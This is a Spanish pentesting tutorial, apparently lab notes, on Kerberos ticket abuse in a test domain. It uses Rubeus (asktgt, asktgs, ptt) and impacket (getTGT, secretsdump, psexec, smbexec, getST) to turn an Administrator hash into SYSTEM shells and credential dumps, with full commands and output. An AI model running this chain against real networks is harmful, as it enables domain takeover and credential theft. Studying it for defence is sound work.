---
icon: tickets
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# ASK-TGT - TGS

Como hicimos anteriormente lo haremos de la misma forma con esta tecnica para obtener el `TGT` y posteriormente el `TGS`, en este caso si hemos capturado el `hash` del `administrador` por algun casual podremos obtener el `TGT` mediante `Rubeus` como vimos anteriormente de la siguiente forma:

Abrimos una `PowerShell` como `administrador` local:

```powershell
cd C:\Users\empleado1\Desktop\Rubeus-master\Rubeus\bin\Debug
.\Rubeus.exe asktgt /domain:corp.local /user:Administrator /rc4:a87f3a337d73085c45f9416be5787d86
```

Info:

```
   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.2

[*] Action: Ask TGT

[*] Using rc4_hmac hash: a87f3a337d73085c45f9416be5787d86
[*] Building AS-REQ (w/ preauth) for: 'corp.local\Administrator'
[*] Using domain controller: 192.168.5.5:88
[+] TGT request successful!
[*] base64(ticket.kirbi):
doIFGDCCBRSgAwIBBaEDAgEWooIELjCCBCphggQmMIIEIqADAgEFoQwbCkNPUlAuTE9DQUyiHzAdoAMCAQKhFjAUGwZrcmJ0Z3QbCmNvcnAubG9jYWyjggPqMIID5qADAgESoQMCAQKiggPYBIID1IZAFwk1djVdJ60YbiJOQ5ocE2IwlcpJwq5HHKB+g2RTA6LKiDIdH73pCsUj6qjTR8dKJ0SNihj/T/m8SyNuFq36nCI/8NplFms1AEOyYNXMBVM6dKUOZRNn5w8n6ElP6x/wRfTE/hf7gg6J9EhWboAIRL39bYCfHY0r+phVgF6ltkNXkZK9wyb4clnq4hERYceCs6lfdmJ/ElwDAlUurLkDrc5uyEuQZeEmQcUVLvo1ASZZGvtEjsSln/W48KdpCKF9yp+ABqZjZ2LCSRzDayyJMZd3RXc9aSxB0BH/a+wT3ZXVWaD4A2Pb/aaIIXs0kCNau69daOmXSTMT4pgckMhvmEv6G+zcHmRkmbw78Jzf9K/rpqwjqH/bBZiWmkOaofUUTUERUT70WaF/YZZ3tvC7HewScCm0oP+XgDbP/6g3g+HdIzriF0kZKzP8iiadxZSTV53KVwf053m3U5+2SRMb1f+UI8KdnxgCY6cZQb1iqgUamBGnFBKb6lUztcMRa4ddSpM9Ha3b3Uh0Prz1y0pGXb0kmmMYqlc82uGWceyrnkOvNSoDbWVVDXFouvauGQTCtS+nYVhpP1HRbLHH65yW/LDberF5+lP6bMGfxlIR1iNrLzJSDyARi91h5bqvzeN7RX2MuM3T6G8EDSaL93wYCWaV8YZ5Q5cSqWE+vtmqie9aacjek5nmdgJZlLmPzYod69q7XTj0vRIx1CIEJOvoOQC1trm0ojgqKVH3GephZoR0hNlod99/rpkxJqpQ/693C0mmTfDbY3GvYXOxMAVYbs2gjxAi0jLTkXkkp4odM4W79hgI1ORSqgMzHFRHIbbzAX+XOCRx4Njs0hi0+V24ugBUGeSNnq7/qD2WuxU/1yj2tm4Q4b01fw8zr0inZc7gQz/yv007iGJBiT37RihhZdUTe4z7T9+D1Qq6nisdZqafphfqvbSwU2lV/7NWfk2Nu7aspqTClcEgEW+14Amj2jRcPrczitLhfuH4M50g6kaw/X/seTeIkk+yToj3U6MoQc2BBiTgfY35nybyc/4/ElfYcuxMsFWSFNyHObqfoP9K8fNwVsEZUdyJCldUKyvfsutl9LCYLSWTSRBlTUkLYYOgVRgH0gqk8y2ub9uUUFTogSsQxw5Pm08Ud1bpBuGh85dMWmXNKvU+QyUgGNHMR845Wk7M7+IiGm7psNYPnqsdlxj3fbTgPXUV3ArbZQiWujkwKmNehfyNrdhOzTHDjlMmh07SblXi5uc6QHaVB5JlFSFUIIn1k5V1WF3hdfDvxHsKcCsXWr7S0RY/v7OwRfdco4HVMIHSoAMCAQCigcoEgcd9gcQwgcGggb4wgbswgbigGzAZoAMCARehEgQQTG/KoBgwkNXYcvzZHrONhKEMGwpDT1JQLkxPQ0FMohowGKADAgEBoREwDxsNQWRtaW5pc3RyYXRvcqMHAwUAQOEAAKURGA8yMDI1MDEyMjA4MjQ0NVqmERgPMjAyNTAxMjIxODI0NDVapxEYDzIwMjUwMTI5MDgyNDQ1WqgMGwpDT1JQLkxPQ0FMqR8wHaADAgECoRYwFBsGa3JidGd0Gwpjb3JwLmxvY2Fs

  ServiceName              :  krbtgt/corp.local
  ServiceRealm             :  CORP.LOCAL
  UserName                 :  Administrator (NT_PRINCIPAL)
  UserRealm                :  CORP.LOCAL
  StartTime                :  22/01/2025 9:24:45
  EndTime                  :  22/01/2025 19:24:45
  RenewTill                :  29/01/2025 9:24:45
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  TG/KoBgwkNXYcvzZHrONhA==
  ASREP (key)              :  A87F3A337D73085C45F9416BE5787D86
```

Y vemos que hemos obtenido perfectamente el `TGT` del usuario `Administrador`.

Ahora una vez teniendo esto, metemos en un archivo este `TGT` en una `oneline` y lo utilizaremos para obtener un `TGS` de forma manual y que no lo haga de forma automatica `Windows`.

```powershell
.\Rubeus.exe asktgs /ticket:doIFGDCCBRSgAwIBBaEDAgEWooIELjCCBCphggQmMIIEIqADAgEFoQwbCkNPUlAuTE9DQUyiHzAdoAMCAQKhFjAUGwZrcmJ0Z3QbCmNvcnAubG9jYWyjggPqMIID5qADAgESoQMCAQKiggPYBIID1IZAFwk1djVdJ60YbiJOQ5ocE2IwlcpJwq5HHKB+g2RTA6LKiDIdH73pCsUj6qjTR8dKJ0SNihj/T/m8SyNuFq36nCI/8NplFms1AEOyYNXMBVM6dKUOZRNn5w8n6ElP6x/wRfTE/hf7gg6J9EhWboAIRL39bYCfHY0r+phVgF6ltkNXkZK9wyb4clnq4hERYceCs6lfdmJ/ElwDAlUurLkDrc5uyEuQZeEmQcUVLvo1ASZZGvtEjsSln/W48KdpCKF9yp+ABqZjZ2LCSRzDayyJMZd3RXc9aSxB0BH/a+wT3ZXVWaD4A2Pb/aaIIXs0kCNau69daOmXSTMT4pgckMhvmEv6G+zcHmRkmbw78Jzf9K/rpqwjqH/bBZiWmkOaofUUTUERUT70WaF/YZZ3tvC7HewScCm0oP+XgDbP/6g3g+HdIzriF0kZKzP8iiadxZSTV53KVwf053m3U5+2SRMb1f+UI8KdnxgCY6cZQb1iqgUamBGnFBKb6lUztcMRa4ddSpM9Ha3b3Uh0Prz1y0pGXb0kmmMYqlc82uGWceyrnkOvNSoDbWVVDXFouvauGQTCtS+nYVhpP1HRbLHH65yW/LDberF5+lP6bMGfxlIR1iNrLzJSDyARi91h5bqvzeN7RX2MuM3T6G8EDSaL93wYCWaV8YZ5Q5cSqWE+vtmqie9aacjek5nmdgJZlLmPzYod69q7XTj0vRIx1CIEJOvoOQC1trm0ojgqKVH3GephZoR0hNlod99/rpkxJqpQ/693C0mmTfDbY3GvYXOxMAVYbs2gjxAi0jLTkXkkp4odM4W79hgI1ORSqgMzHFRHIbbzAX+XOCRx4Njs0hi0+V24ugBUGeSNnq7/qD2WuxU/1yj2tm4Q4b01fw8zr0inZc7gQz/yv007iGJBiT37RihhZdUTe4z7T9+D1Qq6nisdZqafphfqvbSwU2lV/7NWfk2Nu7aspqTClcEgEW+14Amj2jRcPrczitLhfuH4M50g6kaw/X/seTeIkk+yToj3U6MoQc2BBiTgfY35nybyc/4/ElfYcuxMsFWSFNyHObqfoP9K8fNwVsEZUdyJCldUKyvfsutl9LCYLSWTSRBlTUkLYYOgVRgH0gqk8y2ub9uUUFTogSsQxw5Pm08Ud1bpBuGh85dMWmXNKvU+QyUgGNHMR845Wk7M7+IiGm7psNYPnqsdlxj3fbTgPXUV3ArbZQiWujkwKmNehfyNrdhOzTHDjlMmh07SblXi5uc6QHaVB5JlFSFUIIn1k5V1WF3hdfDvxHsKcCsXWr7S0RY/v7OwRfdco4HVMIHSoAMCAQCigcoEgcd9gcQwgcGggb4wgbswgbigGzAZoAMCARehEgQQTG/KoBgwkNXYcvzZHrONhKEMGwpDT1JQLkxPQ0FMohowGKADAgEBoREwDxsNQWRtaW5pc3RyYXRvcqMHAwUAQOEAAKURGA8yMDI1MDEyMjA4MjQ0NVqmERgPMjAyNTAxMjIxODI0NDVapxEYDzIwMjUwMTI5MDgyNDQ1WqgMGwpDT1JQLkxPQ0FMqR8wHaADAgECoRYwFBsGa3JidGd0Gwpjb3JwLmxvY2Fs /service:cifs/DC01.corp.local
```

Y con esto lo que estamos haciendo es solicitar un `Ticket` de servicio para el servicio `cifs` del dominio `corp.local` a nombre del usuario `administrador`.

Info:

```
   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.2

[*] Action: Ask TGS

[*] Requesting default etypes (RC4_HMAC, AES[128/256]_CTS_HMAC_SHA1) for the service ticket
[*] Building TGS-REQ request for: 'cifs/DC01.corp.local'
[*] Using domain controller: DC01.corp.local (192.168.5.5)
[+] TGS request successful!
[*] base64(ticket.kirbi):
doIFYDCCBVygAwIBBaEDAgEWooIEdjCCBHJhggRuMIIEaqADAgEFoQwbCkNPUlAuTE9DQUyiIjAgoAMCAQKhGTAXGwRjaWZzGw9EQzAxLmNvcnAubG9jYWyjggQvMIIEK6ADAgESoQMCAQOiggQdBIIEGZMwASLu//FjL1fUkKEauSDzFv6K+TZ8+07dFPbrBzCOmFsUgHzpgehBhyw/CCU1zfYGqiQ//bYfUyXhYFfuLHu+GZjfj6icU7PoXQMvG196Sd6kUzpHonWSgj9JVCT92YN78SICzAxeW8zwQ/Yar57FGLy/cjCsG+YZwg2+lwTgHWiRfMH551T2XF2MkvNhO7Kee1DKA4PtwkKVBL+jhIsB4vLImiax7YmX19tQNIL+FVgb2qf4J9SyKET1GX78ooAiTtlktsCS2Y0xDAK1kGCh3W+e8zrYJG0MLxnwoGNsIGfKm2wg6C+Y/r2jeo2IToYKz7ILCWB/Sv8bU2gi0tZbywsFdbKx0gZbbl3pakasQmM4LrgTx/3ZVGsJlmGt13dajbyZwcLBLm2cSXAjilpHpEyl0qxAxWgvjGUla3O4XUBKicOCvFktiCGmMIFGlOSpLYwS9eb1vVxvDNIFtvpMAGuOIDG66QYJZJPqxWw/wMf8If0lRvCo4OmBjzFr9zsmPAuavyEApEFozXpHf0aCgQsGuLFpGo0f/NEiI96TtdVbNTJtK6GbUEPsbQ0gKgA+5PB/JFsnd9CUOvGg3qbCGRgscFnAtTSkHQ0/6efqVfhT3VTI+K2e988jy2YUspVz6Qs+xNuIgdCYZI1ptDtJpHbpPZ5aGwg5m8rTUnTFMUyYJl14SgpoDTkxtS62rfNBMiporzIm8GQESRCXRwTWIiI1lND5zuxwY4RQJMIkUTgUpsE1Pp/ZCcAyqyp5/k3rXD7+LFFVaQYelAEW71tPvOyzolf1zAMaQbLhdxVFiz0EolernQqxJENFx6sYiDDIzA/GA5dcFAlyyGtjubmbxwvaTNIKq8F6xWiQ5ci6cDMvULggdJfYzfKfl3Ukc5LoyPU0m+3ag/+UXwTEMby0Pat/iVBDTzDbB7A3ntW/mrvif02M9i5YlwodEX5f6AfigzOjRRyARnvltE3IoEo61R8TC09C8p7R/GozmQYgSlnt3/pq+H9jxiOEJbNWQIygb2uKlVYFIyUl0AEMBvWGRoDM44WBBMBWpsslJN6qqPCeuySVWp6+LGNihx0FNJrznsW6ou+mt5l2n61zLBc3/htOu9OtxREr5oiqjDrcper8mjSHVLXe7oD+gRF3TsCmGHwHHLCxEf5QwbJsI3/NAuLFqpn3OR2dNro2RPYFewSHU7b0hyy8gZJkqBmvojeMcaaEsc8FdeR5Lv5FT2PKGNfN3k9jXhutZnpazeo9dLh0ufQGuvxjehfNfgPTuzQFPNJL+aYsN5RZgwjUh63Bjum/gMdoBm9sbyv2pZpcHAZlSFjL6Y3QtTze9ipJI4YJyrJeQnGcKzTDDtaAmC6w+5LyJWxUhkj1A0jOI9CseHgHU0aFDfAAo4HVMIHSoAMCAQCigcoEgcd9gcQwgcGggb4wgbswgbigKzApoAMCARKhIgQg9VP015rZTU6O3EM4AZ6ckK8UxpYDLYJdabt7UiqeB9+hDBsKQ09SUC5MT0NBTKIaMBigAwIBAaERMA8bDUFkbWluaXN0cmF0b3KjBwMFAEAlAAClERgPMjAyNTAxMjIwODI2MjRaphEYDzIwMjUwMTIyMTgyNDQ1WqgMGwpDT1JQLkxPQ0FMqSIwIKADAgECoRkwFxsEY2lmcxsPREMwMS5jb3JwLmxvY2Fs

  ServiceName              :  cifs/DC01.corp.local
  ServiceRealm             :  CORP.LOCAL
  UserName                 :  Administrator (NT_PRINCIPAL)
  UserRealm                :  CORP.LOCAL
  StartTime                :  22/01/2025 9:26:24
  EndTime                  :  22/01/2025 19:24:45
  RenewTill                :  01/01/0001 1:00:00
  Flags                    :  name_canonicalize, ok_as_delegate, pre_authent, forwardable
  KeyType                  :  aes256_cts_hmac_sha1
  Base64(key)              :  9VP015rZTU6O3EM4AZ6ckK8UxpYDLYJdabt7UiqeB98=
```

Ahora lo que vamos hacer es importarnos este `ticket` que hemos obtenido con `Rubeus` de la siguiente forma:

```powershell
.\Rubeus.exe ptt /ticket:doIFYDCCBVygAwIBBaEDAgEWooIEdjCCBHJhggRuMIIEaqADAgEFoQwbCkNPUlAuTE9DQUyiIjAgoAMCAQKhGTAXGwRjaWZzGw9EQzAxLmNvcnAubG9jYWyjggQvMIIEK6ADAgESoQMCAQOiggQdBIIEGZMwASLu//FjL1fUkKEauSDzFv6K+TZ8+07dFPbrBzCOmFsUgHzpgehBhyw/CCU1zfYGqiQ//bYfUyXhYFfuLHu+GZjfj6icU7PoXQMvG196Sd6kUzpHonWSgj9JVCT92YN78SICzAxeW8zwQ/Yar57FGLy/cjCsG+YZwg2+lwTgHWiRfMH551T2XF2MkvNhO7Kee1DKA4PtwkKVBL+jhIsB4vLImiax7YmX19tQNIL+FVgb2qf4J9SyKET1GX78ooAiTtlktsCS2Y0xDAK1kGCh3W+e8zrYJG0MLxnwoGNsIGfKm2wg6C+Y/r2jeo2IToYKz7ILCWB/Sv8bU2gi0tZbywsFdbKx0gZbbl3pakasQmM4LrgTx/3ZVGsJlmGt13dajbyZwcLBLm2cSXAjilpHpEyl0qxAxWgvjGUla3O4XUBKicOCvFktiCGmMIFGlOSpLYwS9eb1vVxvDNIFtvpMAGuOIDG66QYJZJPqxWw/wMf8If0lRvCo4OmBjzFr9zsmPAuavyEApEFozXpHf0aCgQsGuLFpGo0f/NEiI96TtdVbNTJtK6GbUEPsbQ0gKgA+5PB/JFsnd9CUOvGg3qbCGRgscFnAtTSkHQ0/6efqVfhT3VTI+K2e988jy2YUspVz6Qs+xNuIgdCYZI1ptDtJpHbpPZ5aGwg5m8rTUnTFMUyYJl14SgpoDTkxtS62rfNBMiporzIm8GQESRCXRwTWIiI1lND5zuxwY4RQJMIkUTgUpsE1Pp/ZCcAyqyp5/k3rXD7+LFFVaQYelAEW71tPvOyzolf1zAMaQbLhdxVFiz0EolernQqxJENFx6sYiDDIzA/GA5dcFAlyyGtjubmbxwvaTNIKq8F6xWiQ5ci6cDMvULggdJfYzfKfl3Ukc5LoyPU0m+3ag/+UXwTEMby0Pat/iVBDTzDbB7A3ntW/mrvif02M9i5YlwodEX5f6AfigzOjRRyARnvltE3IoEo61R8TC09C8p7R/GozmQYgSlnt3/pq+H9jxiOEJbNWQIygb2uKlVYFIyUl0AEMBvWGRoDM44WBBMBWpsslJN6qqPCeuySVWp6+LGNihx0FNJrznsW6ou+mt5l2n61zLBc3/htOu9OtxREr5oiqjDrcper8mjSHVLXe7oD+gRF3TsCmGHwHHLCxEf5QwbJsI3/NAuLFqpn3OR2dNro2RPYFewSHU7b0hyy8gZJkqBmvojeMcaaEsc8FdeR5Lv5FT2PKGNfN3k9jXhutZnpazeo9dLh0ufQGuvxjehfNfgPTuzQFPNJL+aYsN5RZgwjUh63Bjum/gMdoBm9sbyv2pZpcHAZlSFjL6Y3QtTze9ipJI4YJyrJeQnGcKzTDDtaAmC6w+5LyJWxUhkj1A0jOI9CseHgHU0aFDfAAo4HVMIHSoAMCAQCigcoEgcd9gcQwgcGggb4wgbswgbigKzApoAMCARKhIgQg9VP015rZTU6O3EM4AZ6ckK8UxpYDLYJdabt7UiqeB9+hDBsKQ09SUC5MT0NBTKIaMBigAwIBAaERMA8bDUFkbWluaXN0cmF0b3KjBwMFAEAlAAClERgPMjAyNTAxMjIwODI2MjRaphEYDzIwMjUwMTIyMTgyNDQ1WqgMGwpDT1JQLkxPQ0FMqSIwIKADAgECoRkwFxsEY2lmcxsPREMwMS5jb3JwLmxvY2Fs
```

Info:

```
   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.2


[*] Action: Import Ticket
[+] Ticket successfully imported!
```

Y vemos que se nos importo de forma correcta, si hacemos `klist` podremos ver lo siguiente:

```
El id. de inicio de sesión actual es 0:0x68992

Vales almacenados en caché: (1)

#0>     Cliente: Administrator @ CORP.LOCAL
        Servidor: cifs/DC01.corp.local @ CORP.LOCAL
        Tipo de cifrado de vale Kerberos: AES-256-CTS-HMAC-SHA1-96
        Marcas de vale 0x40250000 -> forwardable pre_authent ok_as_delegate name_canonicalize
        Hora de inicio: 1/22/2025 9:26:24 (local)
        Hora de finalización:   1/22/2025 19:24:45 (local)
        Hora de renovación: 0
        Tipo de clave de sesión: AES-256-CTS-HMAC-SHA1-96
        Marcas de caché: 0
        KDC llamado:
```

Vemos que tenemos un `ticket` de servicio, justo el que especificamos `cifs`, como el usuario `administrador`.

Ahora vamos hacer el mismo proceso pero desde `Linux` para poder ver varias tecnicas que hay.

### TGT/TGS desde Linux a Windows

Vamos a realizar la misma tecnica para el `TGT` como vimos anteriormente en `linux` de la siguiente forma:

```shell
impacket-getTGT corp.local/Administrator -hashes :a87f3a337d73085c45f9416be5787d86
```

Info:

```
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in Administrator.ccache
```

Una vez que ya tengamos el `TGT` en el archivo `Administrator.ccache` guardado, haremos lo siguiente.

Si nosotros vemos el `help` de la herramienta `impacket` pero de un parametro en concreto, veremos lo siguiente entre tanta linea:

```shell
impacket-secretsdump -h
```

Info:

```
-k    Use Kerberos authentication. Grabs credentials from ccache file (KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use the ones specified in the command line
```

Vemos que con el `-k` utilizara el portocolo `kerberos` que es el que queremos pero cogiendo como variable de entorno el `TGT` que tiene que estar en la palabra `KRB5CCNAME`, por lo que le tendremos que asignar a dicha variable de entorno el `TGT` que acabamos de obtener con la anterior herramienta para que lo coja de forma automatica sin necesidad de pasarle nada.

```shell
export KRB5CCNAME=/home/kali/Administrator.ccache
```

Una vez echo esto, haremos lo siguiente:

```shell
impacket-secretsdump corp.local/Administrator@WS01.corp.local -k -no-pass
```

Info:

```
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Service RemoteRegistry is in stopped state
[*] Service RemoteRegistry is disabled, enabling it
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0xc8125866b327df176940c9f2d6a48f5f
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrador:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Invitado:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:5ed544e71abe56b376b7993b21946520:::
santiago:1001:aad3b435b51404eeaad3b435b51404ee:7ce21f17c0aee7fb9ceba532d0546ad6:::
[*] Dumping cached domain logon information (domain/username:hash)
CORP.LOCAL/empleado1:$DCC2$10240#empleado1#fda53d6158406f827388476bcbc97c37: (2025-01-20 09:22:18)
CORP.LOCAL/Administrator:$DCC2$10240#Administrator#e1c8d7e26653ae629a74772a389cf7e6: (2025-01-21 09:28:20)
CORP.LOCAL/annice.mable:$DCC2$10240#annice.mable#77702054bffe13f7c5bbe919a228d985: (2025-01-12 11:36:13)
CORP.LOCAL/angelika.shelly:$DCC2$10240#angelika.shelly#835512d4e4bb1d962c57d290eb99f670: (2025-01-12 16:51:40)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
CORP\WS01$:plain_password_hex:5700320055006b0049004e0027003d005e0055005c00750052004c0077006e004e00510045003c002d0066005d004b005f007600330072004400350022002700750068004e00300041003d0024006c004e0022005700750065006b00640034004a0056006f003e006c005f006c0050005c005d002700360077002c00290033005e005d004f005e005100560027002e003200380029004f0078005100410049002c003a0025005f00680072005d00380034002500490068002200640045006f0072005c0063002d0022005f002f006f0065006700720022005f0061006c00780047006400590062007700770059005f00
CORP\WS01$:aad3b435b51404eeaad3b435b51404ee:afc5c02d936d73808ce716070e883ab8:::
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x6be6aee6bc489e7fab1ed9a63b1aa5c0d2f13fef
dpapi_userkey:0xb83f8122ee552579d8fbf4d9b304ae19ab5bb7af
[*] NL$KM 
 0000   5C B5 3B 8C D5 28 A0 C3  6A F2 57 A3 08 B6 F7 D4   \.;..(..j.W.....
 0010   E4 7D 11 84 8F 2C 98 2B  2D DD 06 7D 30 53 B4 23   .}...,.+-..}0S.#
 0020   4B 8D C7 7E 92 96 5B 48  67 29 99 50 C1 E4 27 A6   K..~..[Hg).P..'.
 0030   37 2C 9D 99 E8 FD 57 11  CC 44 47 ED 30 6F 96 00   7,....W..DG.0o..
NL$KM:5cb53b8cd528a0c36af257a308b6f7d4e47d11848f2c982b2ddd067d3053b4234b8dc77e92965b4867299950c1e427a6372c9d99e8fd5711cc4447ed306f9600
[*] Cleaning up... 
[*] Stopping service RemoteRegistry
[*] Restoring the disabled state for service RemoteRegistry
```

Vemos que ha funcionado correctamente sin necesidad de meter contraseña, solo simplemente con el `TGT` del usuario `administrador`.

Si por ejemplo nos queremos conectar de forma remota al `DC01` con el `TGT` sin contraseña, podremos hacerlo de la siguiente forma:

```shell
impacket-psexec corp.local/Administrator@DC01.corp.local -k -no-pass
```

Info:

```
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on DC01.corp.local.....
[*] Found writable share ADMIN$
[*] Uploading file OmCmqyOF.exe
[*] Opening SVCManager on DC01.corp.local.....
[*] Creating service CJGu on DC01.corp.local.....
[*] Starting service CJGu.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.20348.1]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```

Y con esto ya estaremos dentro del `DC01` con el usuario `SYSTEM` basicamente el nivel mas alto de privilegios, solamente teniendo el `TGT`.

Tambien podriamos hacerlo de la misma forma pero meidante `SMB`.

```shell
impacket-smbexec corp.local/Administrator@DC01.corp.local -k -no-pass
```

Info:

```
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[!] Launching semi-interactive shell - Careful what you execute
C:\Windows\system32>whoami
nt authority\system
```

De la misma forma podremos obtener un `Ticket` de servicio con la herramienta `impacket` de la siguiente forma:

```shell
impacket-getST -spn cifs/DC01.corp.local -no-pass -k corp.local/Administrator
```

Info:

```
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Getting ST for user
[*] Saving ticket in Administrator@cifs_DC01.corp.local@CORP.LOCAL.ccache
```

Y con esto ya obtendremos el `Ticket` de servicio guardado en el archivo `Administrator@cifs_DC01.corp.local@CORP.LOCAL.ccache`.
